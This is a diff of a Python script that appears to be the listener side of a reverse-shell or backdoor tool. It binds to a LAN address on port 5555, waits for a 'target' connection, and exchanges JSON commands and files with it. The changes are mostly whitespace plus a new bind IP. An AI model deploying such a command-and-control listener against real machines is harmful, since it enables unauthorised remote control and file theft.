@@ -2,6 +2,7 @@ import socket
 import json
 import os
 
+
 def reliable_send(data):
 	jsondata = json.dumps(data)
 	target.send(jsondata.encode())
@@ -16,8 +17,9 @@ def reliable_recv():
 			continue
 
 def upload_file(file_name):
-	f = open(file_name,'rb')
-	target.send(f.read())
+        f = open(file_name, 'rb')
+        target.send(f.read())
+
 
 def download_file(file_name):
 	f = open(file_name, 'wb')
@@ -31,6 +33,7 @@ def download_file(file_name):
 			break
 	target.settimeout(None)
 	f.close()
+
 
 def target_communication():
 	while True:
@@ -50,8 +53,10 @@ def target_communication():
 			result = reliable_recv()
 			print(result)
 
+
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.0.123', 5555))
+sock.bind(('192.168.0.163', 5555))
 print('[+] Listening For The Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
